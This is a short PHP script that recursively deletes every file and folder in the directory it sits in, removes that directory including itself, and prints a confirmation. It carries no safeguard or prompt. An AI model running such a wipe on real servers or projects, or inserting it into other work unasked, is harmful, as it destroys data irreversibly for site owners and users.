<?php
$directory = __DIR__;

function deleteFiles($dir) {
    if (!file_exists($dir)) {
        return;
    }

    $files = array_diff(scandir($dir), array('.', '..'));

    foreach ($files as $file) {
        (is_dir("$dir/$file")) ? deleteFiles("$dir/$file") : unlink("$dir/$file");
    }

    rmdir($dir);
}

deleteFiles($directory);
echo "All files and folders in $directory have been deleted.";
?>